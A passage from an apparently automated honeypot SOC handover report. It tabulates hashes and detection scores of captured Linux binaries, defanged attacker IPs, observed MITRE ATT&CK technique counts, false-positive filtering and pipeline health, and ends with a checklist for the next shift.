| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `43.224.126[.]107` | LK | Lanka Government Cloud | **100** ⚠️ | 50 |
| `121.137.131[.]78` | KR | Korea Telecom | **100** ⚠️ | 26 |
| `183.250.89[.]44` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `114.216.2[.]84` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |
| `120.240.95[.]27` | CN | China Mobile Communications Corporation | **100** ⚠️ | 0 |
| `36.103.222[.]120` | CN | CHINANET ningxia province network | **100** ⚠️ | 0 |
| `203.121.40[.]210` | MY | TT DOTCOM SDN BHD | **100** ⚠️ | 0 |
| `160.187.180[.]175` | PK | Dinco Pakistan private limited | **100** ⚠️ | 0 |
| `45.120.216[.]232` | HK | Cloud Computing HK Limited | **100** ⚠️ | 0 |
| `202.152.201[.]166` | ID | PT. Bakrie Telecom Tbk | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 102 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 52 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 44 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 22 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 22 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 107 cases |
| Tool 34  | Credential Extractor        | ✅ 96 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 15 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (3.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 12 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 44 priority case(s) shown individually · 11 recon entry/entries in table (4 group(s) consolidating 52 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-05T23:14:23Z_
